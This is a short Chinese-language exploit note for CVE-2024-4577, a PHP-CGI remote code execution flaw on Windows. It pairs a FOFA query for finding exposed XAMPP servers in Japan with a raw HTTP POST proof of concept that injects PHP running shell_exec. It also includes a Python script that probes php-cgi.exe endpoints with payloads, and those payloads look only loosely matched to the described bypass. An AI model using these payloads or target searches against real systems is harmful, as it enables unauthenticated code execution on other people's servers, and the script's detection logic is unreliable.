## PHP-CGI-Windows平台远程代码执行漏洞(CVE-2024-4577)

PHP 在设计时忽略 Windows 中对字符转换的Best-Fit 特性，当 PHP-CGI 运行在Window平台且使用了如下语系（简体中文936/繁体中文950/日文932等）时，攻击者可构造恶意请求绕过 CVE-2012-1823 补丁，从而可在无需登陆的情况下执行任意PHP代码。

## fofa

```
app="XAMPP" && country="JP"
```

## poc

```
POST /php-cgi/php-cgi.exe?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

<?php echo shell_exec("dir"); ?>
```

```python
import requests

def test_cgi_vulnerability(url):
    payloads = [
        '/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20"test";?>',
        '/php-cgi/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20"test";?>'
    ]
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if "test" in response.text:
                print(f"Potential vulnerability detected at: {test_url}")
            else:
                print(f"No vulnerability detected at: {test_url}")
        except Exception as e:
            print(f"Error testing {test_url}: {e}")

if __name__ == "__main__":
    url = input("Enter the URL to test (e.g., http://example.com): ")
    test_cgi_vulnerability(url)
```

![image-20240608111234326](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406081112391.png)
